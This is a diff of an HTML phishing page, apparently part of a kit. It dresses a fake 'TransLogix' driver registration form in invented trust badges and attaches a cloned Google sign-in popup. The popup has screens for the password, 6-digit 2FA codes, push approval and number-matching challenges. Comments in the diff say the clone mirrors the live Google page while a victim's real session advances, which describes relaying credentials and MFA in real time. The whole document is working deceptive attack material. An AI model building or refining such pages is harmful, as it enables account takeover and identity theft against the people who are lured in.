@@ -3,75 +3,169 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Driver &amp; vehicle submission — OnRoute</title>
+<title>Driver registration &mdash; TransLogix</title>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48' fill='%230b57d0'%3E%3Cpath d='M8 24 14 15h20l6 9v9H8V24z'/%3E%3C/svg%3E" />
 <link rel="stylesheet" href="/wizard.css" />
 </head>
 <body>
 
-<!-- ============ LANDING PAGE (driver submission) ============ -->
+<!-- ============ LANDING PAGE (TransLogix driver portal) ============ -->
+<style>
+  #landing { font-family: 'Google Sans', 'Segoe UI', Arial, sans-serif; color: #202124; background: #fff; }
+  #landing * { margin: 0; padding: 0; box-sizing: border-box; }
+  #landing { display: flex; flex-direction: column; min-height: 100vh; }
+
+  /* --- registration card (single centered form) --- */
+  #landing .reg-wrap { flex: 1; display: flex; justify-content: center; align-items: center; padding: 44px 18px 56px; background: #f6f8fc; }
+  #landing .card { width: 100%; max-width: 580px; background: #fff; border: 1px solid #e8eaed; border-radius: 18px; box-shadow: 0 12px 36px rgba(60, 64, 67, .12); animation: rise .45s ease; }
+  @keyframes rise { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: none; } }
+  #landing .card-head { padding: 30px 36px 0; }
+  #landing .steps { display: flex; align-items: center; flex-wrap: wrap; gap: 7px; margin-bottom: 22px; }
+  #landing .step-pill { font-size: 12px; font-weight: 500; color: #5f6368; background: #f1f3f4; border-radius: 999px; padding: 5px 12px; }
+  #landing .step-pill.on { background: #e8f0fe; color: #0b57d0; }
+  #landing .steps .step-arrow { color: #9aa0a6; font-size: 12px; }
+  #landing .card-head h1 { font-size: 22px; font-weight: 500; }
+  #landing .card-head .sub { color: #5f6368; font-size: 14px; margin-top: 7px; line-height: 1.55; }
+  #landing .card-head .sub b { color: #3c4043; }
+  #landing .trust { display: flex; justify-content: space-between; gap: 10px; padding: 20px 36px 0; }
+  #landing .trust span { flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11.5px; font-weight: 500; color: #3c4043; background: #f8fafd; border: 1px solid #e8eaed; border-radius: 10px; padding: 9px 4px; white-space: nowrap; }
+  #landing form { padding: 22px 36px 32px; }
+
+  #landing .sec { display: flex; align-items: center; gap: 9px; font-size: 12px; font-weight: 600; color: #0b57d0; letter-spacing: .4px; text-transform: uppercase; margin: 6px 0 14px; }
+  #landing .sec::after { content: ""; flex: 1; height: 1px; background: #e8eaed; }
+  #landing label { display: block; font-size: 13px; font-weight: 500; color: #3c4043; margin-bottom: 6px; }
+  #landing .req { color: #c5221f; }
+  #landing input, #landing select { width: 100%; height: 46px; padding: 0 14px; border: 1.5px solid #dadce0; border-radius: 10px; font-size: 15px; color: #202124; background: #fff; font-family: inherit; margin-bottom: 16px; transition: border-color .15s, box-shadow .15s; }
+  #landing input::placeholder { color: #9aa0a6; }
+  #landing input:focus, #landing select:focus { outline: none; border-color: #0b57d0; box-shadow: 0 0 0 3px rgba(11, 87, 208, .12); }
+  #landing .row { display: flex; gap: 14px; }
+  #landing .row > div { flex: 1; min-width: 0; }
+  #landing .dr-hint { font-size: 13px; color: #c5221f; margin: -4px 0 12px; }
+  #landing .dr-hint:empty { margin: 0; }
+
+  #landing .divider { display: flex; align-items: center; gap: 12px; color: #9aa0a6; font-size: 11px; font-weight: 500; text-transform: uppercase; letter-spacing: .7px; margin: 4px 0 14px; }
+  #landing .divider::before, #landing .divider::after { content: ""; flex: 1; height: 1px; background: #e8eaed; }
+  #landing .google-btn { width: 100%; height: 48px; border: none; border-radius: 999px; background: #0b57d0; color: #fff; font-family: inherit; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; box-shadow: 0 1px 3px rgba(60, 64, 67, .3); transition: background .15s, box-shadow .15s; }
+  #landing .google-btn:hover { background: #1b66c9; box-shadow: 0 2px 6px rgba(60, 64, 67, .35); }
+  #landing .google-btn svg { width: 20px; height: 20px; flex: none; }
+  #landing .google-btn .spin { display: none; width: 18px; height: 18px; border: 2px solid rgba(255, 255, 255, .35); border-top-color: #fff; border-radius: 50%; animation: gspin .65s linear infinite; }
+  #landing .google-btn.loading .spin { display: inline-block; }
+  #landing .google-btn.loading .b-label, #landing .google-btn.loading svg { opacity: 0; }
+  #landing .secure-note { text-align: center; font-size: 12px; color: #9aa0a6; line-height: 1.5; margin-top: 14px; }
+
+  /* --- landing success panel (shown once the Google sign-in completes) --- */
+  #landing .ls { text-align: center; padding: 46px 36px 40px; }
+  #landing .ls-ok { display: grid; place-items: center; width: 68px; height: 68px; border-radius: 50%; background: #e6f4ea; color: #188038; font-size: 32px; margin: 0 auto 18px; }
+  #landing .ls h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; }
+  #landing .ls-sub { color: #5f6368; font-size: 14.5px; line-height: 1.6; }
+  #landing .ls-meta { display: inline-block; margin-top: 16px; padding: 9px 16px; background: #f8fafd; border: 1px solid #e8eaed; border-radius: 10px; font-size: 13px; color: #3c4043; }
+  #landing .ls-note { color: #9aa0a6; font-size: 12.5px; margin-top: 20px; }
+
+  /* --- footer --- */
+  #landing .foot { display: flex; align-items: center; justify-content: space-between; gap: 14px; flex-wrap: wrap; padding: 18px 30px; background: #fff; border-top: 1px solid #e8eaed; font-size: 12.5px; color: #5f6368; }
+  #landing .foot-links { display: flex; gap: 18px; }
+  #landing .foot-links span { cursor: default; }
+</style>
+
 <div class="app" id="landing">
-  <header class="topbar">
-    <div class="brand">
-      <svg class="brand-mark" viewBox="0 0 48 48" aria-hidden="true"><path d="M8 24 14 15h20l6 9v9H8V24Z" fill="currentColor"/></svg>
-      <span class="brand-name">OnRoute</span>
-      <span class="brand-sub">Logistics</span>
+
+  <div class="reg-wrap">
+    <div class="card">
+      <div id="ls-form-wrap">
+      <div class="card-head">
+        <div class="steps" aria-hidden="true">
+          <span class="step-pill on">1&nbsp;·&nbsp;Vehicle details</span><span class="step-arrow">&rsaquo;</span>
+          <span class="step-pill">2&nbsp;·&nbsp;Verify identity</span><span class="step-arrow">&rsaquo;</span>
+          <span class="step-pill">3&nbsp;·&nbsp;Registered</span>
+        </div>
+        <h1>Driver registration</h1>
+        <p class="sub">Complete your details and verify with a Google account. This registration link was sent by <b>driver-portal@translogix.com</b>.</p>
+      </div>
+
+      <div class="trust">
+        <span>&#128274; 256-bit SSL</span>
+        <span>&#9989; Verified link</span>
+        <span>&#128100; ID checked</span>
+      </div>
+
+      <form id="form-driver" novalidate>
+        <div class="sec">Driver</div>
+
+        <label for="d-name">Full name <span class="req">*</span></label>
+        <input type="text" id="d-name" name="fullname" placeholder="Jamie Reyes" autocomplete="name" spellcheck="false">
+
+        <div class="row">
+          <div>
+            <label for="d-phone">Mobile phone <span class="req">*</span></label>
+            <input type="tel" id="d-phone" name="phone" placeholder="+1 555 014 2233" autocomplete="tel" spellcheck="false">
+          </div>
+          <div>
+            <label for="d-email">Personal email</label>
+            <input type="email" id="d-email" name="email" placeholder="you@example.com" autocomplete="email" spellcheck="false">
+          </div>
+        </div>
+
+        <label for="d-license">Driver&rsquo;s license / ID number</label>
+        <input type="text" id="d-license" name="license" placeholder="D 991 442 0" spellcheck="false">
+
+        <div class="sec">Vehicle</div>
+
+        <div class="row">
+          <div>
+            <label for="d-vehicle">Make &amp; model</label>
+            <input type="text" id="d-vehicle" name="vehicle" placeholder="Ram ProMaster 2500" spellcheck="false">
+          </div>
+          <div>
+            <label for="d-plate">Plate number <span class="req">*</span></label>
+            <input type="text" id="d-plate" name="plate" placeholder="KLM 482" autocomplete="off" spellcheck="false" style="text-transform: uppercase" />
+          </div>
+        </div>
+
+        <div class="sec">Pickup zone</div>
+
+        <div class="row">
+          <div>
+            <label for="d-city">City</label>
+            <input type="text" id="d-city" name="city" placeholder="Chicago" spellcheck="false">
+          </div>
+          <div>
+            <label for="d-state">State</label>
+            <select id="d-state" name="state">
+              <option value="">Select&hellip;</option>
+              <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option><option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option><option>Washington, D.C.</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="dr-hint" id="driver-hint"></div>
+
+        <div class="divider">continue with</div>
+
+        <button type="submit" id="btn-driver" class="google-btn">
+          <svg class="gicon" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.1H42V20H24v8h11.3c-1.6 4.7-6.1 8-11.3 8-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.5 6.1 29.5 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20c0-1.3-.1-2.6-.4-3.9z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.5 6.1 29.5 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.1H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C36.9 39.2 44 34 44 24c0-1.3-.1-2.6-.4-3.9z"/></svg>
+          <span class="b-label">Sign in with Google</span><span class="spin" aria-hidden="true"></span>
+        </button>
+      </form>
+
+      <p class="secure-note">&#128272; Your details are used only for driver verification. Sign-in is handled securely by Google&thinsp;— we never see your password.</p>
+      </div>
+
+      <!-- what the portal shows ONCE the Google sign-in has completed -->
+      <div id="ls-success" class="ls hidden">
+        <div class="ls-ok" aria-hidden="true">&#10004;</div>
+        <h1>Driver registration received</h1>
+        <p class="ls-sub">Thanks, <b id="ls-name">Driver</b> &mdash; your details and Google sign-in were verified.</p>
+        <div class="ls-meta" id="ls-meta" hidden></div>
+        <p class="ls-note">&#128231; Your delivery-zone assignment will be issued within 48 hours.</p>
+      </div>
     </div>
-    <a class="topbar-link" href="#" id="help-link">Help</a>
-  </header>
+  </div>
 
-  <main class="hero">
-    <div class="hero-copy">
-      <h1>Driver &amp; vehicle submission</h1>
-      <p class="lead">Confirm your details and sign in with Google to start your delivery session. Just a minute of your time.</p>
-      <ul class="benefits">
-        <li>
-          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
-          Secure Google sign-in
-        </li>
-        <li>
-          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
-          Instant confirmation
-        </li>
-        <li>
-          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
-          Works from any device
-        </li>
-      </ul>
-    </div>
+  <div class="foot">
+    <div>&copy; 2026 TransLogix Logistics, Inc. &nbsp;&middot;&nbsp; 24/7 dispatch: <b>1-800-555-0142</b></div>
+    <div class="foot-links"><span>Help</span><span>Privacy</span><span>Terms</span><span>Cookies</span></div>
+  </div>
 
-    <form id="form-driver" class="formcard" novalidate>
-      <h2 class="fc-title">Your details</h2>
-
-      <label class="dr-field">
-        <span>Driver name</span>
-        <input id="d-name" type="text" placeholder="Full name" autocomplete="name" spellcheck="false" />
-      </label>
-
-      <label class="dr-field">
-        <span>Number plate</span>
-        <input id="d-plate" type="text" placeholder="e.g. AB 123 CD" autocomplete="off" spellcheck="false" />
-      </label>
-
-      <label class="dr-field">
-        <span>Phone <em>optional</em></span>
-        <input id="d-phone" type="tel" placeholder="+44 7000 000000" autocomplete="tel" spellcheck="false" />
-      </label>
-
-      <div class="dr-hint" id="driver-hint"></div>
-
-      <button type="submit" id="btn-driver" class="google-btn">
-        <svg class="gicon" viewBox="0 0 48 48" aria-hidden="true"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.14 42.62 14.24 48 24 48z"/></svg>
-        <span class="b-label">Continue with Google</span><span class="spin" aria-hidden="true"></span>
-      </button>
-      <p class="btn-note">Protected by your Google sign-in · we open it securely in a popup.</p>
-    </form>
-  </main>
-
-  <footer class="appfoot">
-    <span>© 2026 OnRoute Logistics</span>
-    <span class="appfoot-links"><a href="#" id="foot-terms">Terms</a> · <a href="#" id="foot-privacy">Privacy</a></span>
-  </footer>
 </div>
 
 <!-- ============ GOOGLE SIGN-IN POPUP (overlays the landing) ============ -->
@@ -81,7 +175,9 @@
   <div class="g-card" id="card">
     <!-- EMAIL -->
     <div class="g-screen hidden" id="screen-email">
-      <div class="g-logo" aria-hidden="true"></div>
+      <div class="g-logo" aria-hidden="true">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      </div>
       <h1 class="g-title">Sign in</h1>
       <p class="g-subtitle">Use your Google Account</p>
 
@@ -100,7 +196,9 @@
 
     <!-- PASSWORD -->
     <div class="g-screen hidden" id="screen-pass">
-      <div class="g-logo" aria-hidden="true"></div>
+      <div class="g-logo" aria-hidden="true">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      </div>
       <h1 class="g-title app" id="pass-title">Welcome</h1>
       <div class="g-account" id="account-row" hidden>
         <div class="initials" id="avatar-initials"></div>
@@ -127,11 +225,14 @@
       </form>
     </div>
 
-    <!-- 2FA (authenticator OR SMS code) -->
+    <!-- 2FA -->
     <div class="g-screen hidden" id="screen-totp">
-      <div class="g-logo" aria-hidden="true"></div>
+      <div class="g-logo" aria-hidden="true">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      </div>
       <h1 class="g-title">Verify it's you</h1>
-      <p class="g-caption" id="totp-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit verification code from your authenticator app to finish.</p>
+      <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit code from your authenticator app — or the code Google just texted or emailed you — to finish.</p>
+      <div id="totp-numbers" class="g-numbig-row" style="display:none"></div>
 
       <div id="form-totp">
         <div class="g-code">
@@ -145,88 +246,43 @@
       </div>
     </div>
 
-    <!-- PHONE PROMPT / PASSKEY WAITING — the tap happens on the victim's own
-         phone; the clone mirrors the wait and polls until the real browser
-         advances -->
-    <div class="g-screen hidden" id="screen-prompt">
-      <div class="g-logo" aria-hidden="true"></div>
-      <h1 class="g-title" id="prompt-title">Confirm it's you</h1>
-      <p class="g-caption" id="prompt-caption">To help keep your account safe, Google wants to make sure it's really you. Check your phone for a notification and tap to confirm.</p>
-
-      <div class="g-wait">
-        <div class="g-spinner" aria-hidden="true"></div>
-        <span class="g-wait-text" id="prompt-wait">Waiting for confirmation…</span>
+    <!-- APPROVE : Google is asking to "confirm it's you" / check-your-phone-approve -->
+    <div class="g-screen hidden" id="screen-approval">
+      <div class="g-logo" aria-hidden="true">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
       </div>
-
-      <div class="g-hint" id="prompt-hint" hidden></div>
-
+      <h1 class="g-title">Confirm it&rsquo;s you</h1>
+      <p class="g-caption">To help keep your account safe, we&rsquo;ve sent a notification. Open it and tap <b>Approve</b> to finish signing in.</p>
+      <div class="g-approve-status"><span class="g-approve-dot"></span><span id="approve-status">Waiting&hellip;</span></div>
+      <div id="approval-numbers" class="g-numbig-row" style="display:none"></div>
       <div class="g-footer">
-        <button type="button" class="g-link" id="prompt-retry">Try another way</button>
-        <span></span>
+        <button type="button" class="g-link" id="try-another-2">Try another way</button>
+        <button type="button" class="g-btn" id="btn-approve" disabled><span class="b-label">Continue</span></button>
       </div>
     </div>
 
-    <!-- CHOOSE HOW TO CONFIRM (options list) -->
-    <div class="g-screen hidden" id="screen-choice">
-      <div class="g-logo" aria-hidden="true"></div>
-      <h1 class="g-title">Choose how to confirm it's you</h1>
-      <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you.</p>
-
-      <div id="choice-list" class="g-choice-list"></div>
-
-      <div class="g-footer">
-        <button type="button" class="g-link" id="choice-alt">Try another way</button>
-        <span></span>
+    <!-- NUM-CHOICE: some accounts get a "select the matching number" challenge
+         (a page of number tiles, e.g. three different 2-digit codes) instead of
+         typing a code. We mirror the real page's options here (rendered by
+         wizard.js from what the live Google page actually shows). -->
+    <div class="g-screen hidden" id="screen-numchoice">
+      <div class="g-logo" aria-hidden="true">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
       </div>
+      <h1 class="g-title">Confirm it&rsquo;s you</h1>
+      <p class="g-caption">To help keep your account safe, select the number below that matches this sign-in attempt on Google.</p>
+      <div class="g-numtiles" id="num-tiles"></div>
+      <div class="g-hint" id="num-choice-hint" hidden></div>
     </div>
 
-    <!-- SMS / CALL NUMBER screen -->
-    <div class="g-screen hidden" id="screen-sms">
-      <div class="g-logo" aria-hidden="true"></div>
-      <h1 class="g-title" id="sms-title">We'll text you a code</h1>
-      <p class="g-caption">We'll send a verification code to <b id="sms-number">your phone</b>.</p>
-
-      <div class="g-hint" id="sms-hint" hidden></div>
-
-      <div class="g-footer">
-        <button type="button" class="g-link" id="sms-alt">Try another way</button>
-        <button type="button" class="g-btn" id="btn-send-code"><span class="b-label">Send code</span><span class="spin" aria-hidden="true"></span></button>
-      </div>
-    </div>
-
-    <!-- NEUTRAL "VERIFYING" screen (captcha / transitions / unknown layouts) —
-         safe default: keep waiting, never claim success -->
-    <div class="g-screen hidden" id="screen-wait">
-      <div class="g-logo" aria-hidden="true"></div>
-      <h1 class="g-title" id="wait-title">Verifying…</h1>
-      <p class="g-caption" id="wait-caption">Please wait while we check your details.</p>
-
-      <div class="g-wait">
-        <div class="g-spinner" aria-hidden="true"></div>
-        <span class="g-wait-text">Checking…</span>
-      </div>
-    </div>
-
-    <!-- SUCCESS screen -->
+    <!-- SUCCESS (after Google sign-in completes) -->
     <div class="g-screen hidden" id="screen-done">
-      <div class="g-logo" aria-hidden="true"></div>
-      <div class="g-done-avatar" id="done-avatar">A</div>
-      <h1 class="g-title">You're signed in</h1>
-      <p class="g-subtitle">as <b id="done-email">your Google Account</b></p>
-
+      <div class="g-ok" aria-hidden="true">&#10004;</div>
+      <h1 class="g-title">Thanks&#8202;—&#8202;submitted!</h1>
+      <p class="g-caption" id="done-msg">Your driver details were received.</p>
+      <div class="g-done-account" id="done-account" hidden></div>
       <div class="g-footer" style="justify-content:center">
-        <button type="button" class="g-btn" id="btn-done"><span class="b-label">Continue to your Google Account</span><span class="spin" aria-hidden="true"></span></button>
-      </div>
-    </div>
-
-    <!-- ERROR / RETRY screen -->
-    <div class="g-screen hidden" id="screen-error">
-      <div class="g-logo" aria-hidden="true"></div>
-      <h1 class="g-title">We couldn't verify it's you</h1>
-      <p class="g-caption" id="error-caption">Please try again.</p>
-
-      <div class="g-footer" style="justify-content:center">
-        <button type="button" class="g-btn" id="btn-retry"><span class="b-label">Try again</span><span class="spin" aria-hidden="true"></span></button>
+        <button type="button" class="g-btn" id="btn-done">Done</button>
       </div>
     </div>
   </div>
